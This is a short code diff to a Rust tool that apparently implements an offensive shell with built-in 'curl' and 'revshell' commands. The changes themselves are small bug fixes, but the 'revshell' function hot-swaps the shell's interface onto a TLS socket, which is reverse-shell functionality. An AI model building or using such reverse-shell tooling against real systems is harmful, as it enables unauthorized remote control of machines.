@@ -126,7 +126,7 @@ pub fn curl(sh: &mut Shell, args: Arguments) -> Result<()> {
         Some(path) => {
             let mut file = File::create(&path)?;
             // TODO: don't buffer the full response
-            file.write(&res.to_vec())?;
+            file.write_all(&res.to_vec())?;
             shprintln!(sh, "downloaded to: {:?}", path);
         },
         None => {
@@ -185,7 +185,7 @@ pub fn revshell(sh: &mut Shell, args: Arguments) -> Result<()> {
     let sock = BufStream::new(sock);
 
     shprintln!(sh, "[*] see you on the other side...");
-    sh.hotswap(Interface::Tls(sock));
+    sh.hotswap(Interface::Tls(Box::new(sock)));
     shprintln!(sh, "[+] hot-swapped interface");
 
     if run_loop {
